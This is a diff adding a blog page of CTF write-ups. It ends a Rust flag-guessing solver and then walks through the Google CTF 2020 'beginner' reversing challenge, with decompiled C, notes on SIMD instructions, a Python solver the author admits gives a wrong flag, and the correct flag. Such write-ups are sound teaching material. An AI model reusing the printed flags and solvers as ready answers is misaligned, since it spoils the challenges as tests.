+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> flag</span><span style="color:#ccc9c2cc;">: </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;</span><span style="color:#ffa759;">u8</span><span>&gt; </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">bytes</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">collect</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">// can&#39;t consistently crack the last two chars because there isn&#39;t space to make long binary tree branches
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">// the last char is known to be } because of the flag format but the second to last char just needs to be guessed
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">// it was pretty obviously e from the pattern
+</span><span>    </span><span style="color:#ffa759;">for </span><span style="color:#f29e74;">_ in </span><span style="color:#ffcc66;">0</span><span style="color:#f29e74;">..</span><span style="color:#ffcc66;">14 </span><span>{
+</span><span>        </span><span style="color:#ffa759;">let</span><span> next </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">discover_next</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>flag)</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>        flag</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">push</span><span>(next)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f28779;">println!</span><span>(</span><span style="color:#bae67e;">&quot;flag thus far: </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">String</span><span style="color:#f29e74;">::</span><span>from_utf8_lossy(</span><span style="color:#f29e74;">&amp;</span><span>flag))</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#f28779;">assert_eq!</span><span>( </span><span style="font-style:italic;color:#5ccfe6;">String</span><span style="color:#f29e74;">::</span><span>from_utf8_lossy(</span><span style="color:#f29e74;">&amp;</span><span>flag) </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&quot;e}&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;CTF{1BitAtATime}&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="font-style:italic;color:#5ccfe6;">Ok</span><span>(())
+</span><span>}
+</span></code></pre>
+<h1 id="beginner">beginner</h1>
+<p><em>reversing, easy</em></p>
+<p><a href="https://github.com/tamucybersec/gctf-2020/tree/master/reversing/beginner">source</a></p>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/tcheinen">theinen</a>, <a href="https://github.com/komputerwiz">komputerwiz</a></p>
+<h2 id="initial-review-2">initial review</h2>
+<p>We're provided a single binary called a.out</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./a.out
+</span><span>Flag: hello
+</span><span>FAILURE
+</span></code></pre>
+<p>Running it shows a flag prompt and it says "FAILURE" when I type hello.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>ulong </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">uint</span><span> uVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined auVar3 [</span><span style="color:#ffcc66;">16</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined local_38 [</span><span style="color:#ffcc66;">16</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_28 [</span><span style="color:#ffcc66;">4</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Flag: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_0010200b</span><span style="color:#ccc9c2cc;">,</span><span>local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>  auVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">pshufb</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span>SHUFFLE)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">SUB164</span><span>(auVar3</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#f29e74;">+</span><span> ADD32</span><span style="color:#f29e74;">.</span><span>_0_4_ </span><span style="color:#f29e74;">^ </span><span style="color:#ffd580;">SUB164</span><span>(XOR</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strncmp</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span>local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x10</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    uVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strncmp</span><span>(local_28</span><span style="color:#ccc9c2cc;">,</span><span>EXPECTED_PREFIX</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(uVar2 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;SUCCESS&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">goto</span><span> LAB_00101112</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>  }
+</span><span>  uVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;FAILURE&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#73d0ff;">LAB_00101112</span><span style="color:#ccc9c2cc;">:
+</span><span>  </span><span style="color:#ffa759;">return </span><span>(ulong)uVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The program reads 15 chars into memory and then applies 3 SIMD operations.  If the input and modified strings are the same and the modified string starts with CTF{ then it says SUCCESS.  It looks like our goal is to construct a 15 char string matching CTF{.*} that can have those operations applied to it without changing it.  The right operand of each instruction is a constant 16 byte array and they are below.<br />
+xor: <code>76 58 b4 49 8d 1a 5f 38 d4 23 f8 34 eb 86 f9 aa</code>
+add32: <code>ef be ad de ad de e1 fe 37 13 37 13 66 74 63 67</code>
+shuffle: <code>02 06 07 01 05 0b 09 0e 03 0f 04 08 0a 0c 0d 00</code></p>
+<p>The operations are as follows:</p>
+<h3 id="pshufb">pshufb</h3>
+<p>pshufb shuffles bytes in a 128-bit register by moving them into the location specified by the second operand.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>x[16];
+</span><span>y[16];
+</span><span>o[16];
+</span><span>
+</span><span>for(int i = 0; i &lt; 16; i++) {
+</span><span>  o[i] = (y[i] &lt; 0) ? 0 : x[y[i] % 16];
+</span><span>}
+</span></code></pre>
+<h3 id="paddd">paddd</h3>
+<p>paddd performs four 32 bit additions and stores the output in that range of the output array</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>x[128];
+</span><span>y[128];
+</span><span>o[128];
+</span><span>
+</span><span>o[0..31] = x[0..31] + y[0..31];
+</span><span>o[32..63] = x[32..63] + y[32..63];
+</span><span>o[64..95] = x[64..95] + y[64..95];
+</span><span>o[96..127] = x[96..127] + y[96..127];
+</span></code></pre>
+<h3 id="pxor">pxor</h3>
+<p>pxor performs a bitwise xor operation across both operands.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>x[128];
+</span><span>y[128];
+</span><span>o[128];
+</span><span>
+</span><span>for(int i = 0; i &lt; 128; i++) {
+</span><span>  o[i] = x[i] ^ y[i];
+</span><span>}
+</span></code></pre>
+<h2 id="solution">solution</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
+</span><span>
+</span><span>
+</span><span>flag </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;_&quot; </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">16</span><span>)]
+</span><span>
+</span><span>known </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffcc66;">0xe</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0xf</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x3</span><span>]
+</span><span>
+</span><span>
+</span><span>flag[</span><span style="color:#ffcc66;">0x0</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;C&quot;
+</span><span>flag[</span><span style="color:#ffcc66;">0x1</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;T&quot;
+</span><span>flag[</span><span style="color:#ffcc66;">0x2</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;F&quot;
+</span><span>flag[</span><span style="color:#ffcc66;">0x3</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;{&quot;
+</span><span>flag[</span><span style="color:#ffcc66;">0xe</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;}&quot;
+</span><span>flag[</span><span style="color:#ffcc66;">0xf</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;
+</span><span>
+</span><span>xor </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&quot;76 58 b4 49 8d 1a 5f 38 d4 23 f8 34 eb 86 f9 aa&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;&quot;</span><span>))
+</span><span>add32 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&quot;ef be ad de ad de e1 fe 37 13 37 13 66 74 63 67&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;&quot;</span><span>))
+</span><span>shuffle </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&quot;02 06 07 01 05 0b 09 0e 03 0f 04 08 0a 0c 0d 00&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;&quot;</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">reverse</span><span>(</span><span style="color:#ffcc66;">index</span><span>):
+</span><span>	char </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">ord</span><span>(flag[index])
+</span><span>	</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">256</span><span>):
+</span><span>		</span><span style="color:#ffa759;">if </span><span>((i </span><span style="color:#f29e74;">+ </span><span>add32[index]) </span><span style="color:#f29e74;">% </span><span style="color:#ffcc66;">256</span><span>) </span><span style="color:#f29e74;">^ </span><span>xor[index] </span><span style="color:#f29e74;">== </span><span>char:
+</span><span>			 </span><span style="color:#ffa759;">return </span><span style="color:#f28779;">chr</span><span>(i)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">while </span><span style="color:#f28779;">len</span><span>(known) </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>	curr </span><span style="color:#f29e74;">= </span><span>known</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pop</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>	into </span><span style="color:#f29e74;">= </span><span>shuffle[curr]
+</span><span>	</span><span style="color:#ffa759;">if </span><span>flag[into] </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&quot;_&quot;</span><span>:
+</span><span>		</span><span style="color:#ffa759;">continue
+</span><span>	solved </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">reverse</span><span>(curr)
+</span><span>	flag[into] </span><span style="color:#f29e74;">= </span><span>solved
+</span><span>	known</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(into)
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(flag))
+</span></code></pre>
+<p>This was our solver script.  The careful observer (aka if you executed it) may notice that the flag it gives isn't correct.  The solved flag is <code>CTF{S1NEf0rM3!}</code> and the correct flag is <code>CTF{S1MDf0rM3!}</code>.  This happened because of a misunderstanding in how the PADDD instruction worked.  I assumed a bytewise addition across the registers, but it actually performed four 32-bit additions.  Elements 6 and 7 from the add32 array have the most significant bit flipped so they required carrying that couldn't happen on bitwise addition.</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">23 August 2020</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
